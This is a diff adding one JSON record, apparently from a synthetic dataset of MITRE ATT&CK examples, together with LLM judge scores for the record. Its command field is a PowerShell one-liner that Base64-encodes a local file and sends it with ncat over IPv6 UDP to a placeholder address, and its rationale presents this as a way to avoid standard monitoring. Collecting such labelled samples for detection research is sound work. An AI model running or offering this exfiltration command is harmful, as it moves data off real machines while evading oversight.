@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u 2001:db8:dead:beef::20 57344 --send-only",
+  "explanation": "Uses Nmap's ncat to exfiltrate over IPv6 UDP to a high, uncommon port, distinct from typical web egress. Base64 reduces readability while staying within simple encoding, consistent with T1011\u2019s use of a different network medium.",
+  "rationale_steps": [
+    "Encode file bytes to Base64.",
+    "Transmit over IPv6 UDP to an uncommon high-numbered port to avoid standard monitoring paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-21870377",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell assignment and base64 conversion are correctly formed, quoting is balanced, and the ncat.exe invocation with -6, -u, and --send-only flags is valid with proper piping of STDIN.",
+        "semantic_score": 4,
+        "semantic_justification": "It base64-encodes a file and transmits it via ncat over IPv6 UDP to a high port consistent with automated exfiltration, though use of a documentation IPv6 address and potential UDP size/fragmentation issues slightly reduce operational realism.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:51:19.918232Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced parentheses, proper variable assignment, correct piping, and valid PowerShell syntax for base64 conversion and file reading.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by reading a file, encoding it to base64, and transmitting it over UDP via IPv6 to a specific destination using ncat with appropriate flags (--send-only, -u for UDP).",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:51:22.905535Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid PowerShell syntax for variable assignment, .NET method calls, command separation, and ncat flags with correct arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of exfiltrating base64-encoded data over IPv6 UDP using ncat, aligning precisely with the T1011 technique for automated exfiltration via an alternative protocol.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:34:00.925791Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
